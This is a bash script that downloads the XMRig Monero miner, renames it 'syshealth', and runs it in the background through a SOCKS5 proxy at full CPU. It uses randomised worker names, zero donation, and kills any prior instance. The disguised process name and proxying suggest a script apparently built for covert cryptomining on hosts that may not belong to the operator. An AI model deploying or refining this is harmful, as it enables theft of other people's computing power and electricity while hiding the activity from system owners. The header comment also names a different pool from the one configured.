#!/bin/bash
# ally.sh - Optimized miner setup using pool.waivy.dev proxy
# Usage: bash ally.sh

# --- CONFIGURE THESE ---
WALLET="49J8k2f3qtHaNYcQ52WXkHZgWhU4dU8fuhRJcNiG9Bra3uyc2pQRsmR38mqkh2MZhEfvhkh2bNkzR892APqs3U6aHsBcN1F"
POOL_URL="pool.supportxmr.com:443"
SOCKS5_PROXY="127.0.0.1:1080"  # Tailscale SOCKS5
CPU_PCT=100  # Max CPU usage
WORKER_NAME="worker-$(tr -dc 'a-z0-9' </dev/urandom | head -c 6)"
# ----------------------

set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CONFIG_FILE="$SCRIPT_DIR/config.json"

# Ensure dependencies (minimal - no tor needed)
for dep in curl; do
  if ! command -v $dep >/dev/null 2>&1; then
    echo "$dep not found. Installing..."
    apt-get update && apt-get install -y $dep 2>/dev/null || sudo apt-get update && sudo apt-get install -y $dep
  fi
done

# Download syshealth (XMRig) if not present
if [ ! -f "$SCRIPT_DIR/syshealth" ]; then
  XMRIG_VERSION="6.21.0"
  echo "Downloading XMRig $XMRIG_VERSION..."
  curl -L -o /tmp/xmrig.tar.gz "https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/xmrig-${XMRIG_VERSION}-linux-static-x64.tar.gz"
  tar -xzf /tmp/xmrig.tar.gz -C /tmp
  mv "/tmp/xmrig-${XMRIG_VERSION}/xmrig" "$SCRIPT_DIR/syshealth"
  chmod +x "$SCRIPT_DIR/syshealth"
  rm -rf /tmp/xmrig* /tmp/xmrig-${XMRIG_VERSION}
fi

# Generate optimized config.json
cat > "$CONFIG_FILE" <<EOF
{
  "autosave": true,
  "background": false,
  "colors": false,
  "title": false,
  "randomx": {
    "init": -1,
    "init-avx2": -1,
    "mode": "auto",
    "1gb-pages": false,
    "rdmsr": true,
    "wrmsr": true,
    "cache_qos": false,
    "numa": true,
    "scratchpad_prefetch_mode": 1
  },
  "cpu": {
    "enabled": true,
    "huge-pages": true,
    "huge-pages-jit": false,
    "hw-aes": null,
    "priority": 5,
    "memory-pool": true,
    "yield": false,
    "asm": true,
    "max-threads-hint": $CPU_PCT
  },
  "log-file": null,
  "donate-level": 0,
  "donate-over-proxy": 0,
  "pools": [
    {
      "url": "$POOL_URL",
      "user": "$WALLET.$WORKER_NAME",
      "pass": "x",
      "rig-id": "$WORKER_NAME",
      "keepalive": true,
      "tls": true,
      "socks5": "$SOCKS5_PROXY",
      "enabled": true
    }
  ],
  "retries": 5,
  "retry-pause": 5,
  "print-time": 60,
  "syslog": false,
  "verbose": 0
}
EOF

# Kill any existing miners
pkill -9 -f syshealth 2>/dev/null || true
sleep 1

# Start miner
LOGFILE="$SCRIPT_DIR/xmrig.log"
echo "[ally] Starting miner with pool.waivy.dev..."
nohup "$SCRIPT_DIR/syshealth" -c "$CONFIG_FILE" > "$LOGFILE" 2>&1 &
sleep 3

if pgrep -f "$SCRIPT_DIR/syshealth" > /dev/null; then
  MINER_PID=$(pgrep -f "$SCRIPT_DIR/syshealth" | head -1)
  echo "========================================"
  echo "  ✓ Mining started!"
  echo "========================================"
  echo "Pool:    $POOL_URL (TLS)"
  echo "Worker:  $WORKER_NAME"
  echo "PID:     $MINER_PID"
  echo "Log:     $LOGFILE"
  echo ""
  echo "Monitor: tail -f $LOGFILE"
  echo "Stop:    pkill -f syshealth"
  echo "========================================"
else
  echo "Error: Failed to start miner"
  cat "$LOGFILE"
  exit 1
fi
